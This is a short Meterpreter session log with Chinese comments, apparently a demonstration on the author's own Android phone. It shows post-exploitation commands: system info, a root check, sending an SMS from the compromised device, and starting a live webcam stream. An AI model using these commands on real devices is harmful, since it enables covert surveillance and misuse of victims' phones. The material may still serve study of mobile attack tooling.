#系统信息
meterpreter > sysinfo
Computer : localhost
OS : Android 7.1.2 - Linux 3.18.31-gc725c42 (aarch64)
Meterpreter : java/android

#查看 root 状态
meterpreter > check_root
[+] Device is rooted

#发送短信
meterpreter > send_sms
[-] You must enter both a destination address -d and the SMS text body -t
[-] e.g. send_sms -d +351961234567 -t "GREETINGS PROFESSOR FALKEN."

OPTIONS:

    -d  <opt>  Destination number
    -dr        Wait for delivery report
    -h         Help Banner
    -t  <opt>  SMS body text

meterpreter > send_sms -d +8610086 -t "我是你爸爸"
[+] SMS sent - Transmission successful

meterpreter > #网页视频聊天（我手机没合适浏览器没打开）
meterpreter > webcam_chat
[*] Webcam chat session initialized.
[-] Error running command webcam_chat: RuntimeError Unable to find a suitable browser on the target machine

#网页摄像头视频流，显示实时画面
meterpreter > webcam_stream
[*] Starting...
[*] Preparing player...
[*] Opening player at: lwqAtUFm.html
[*] Streaming...
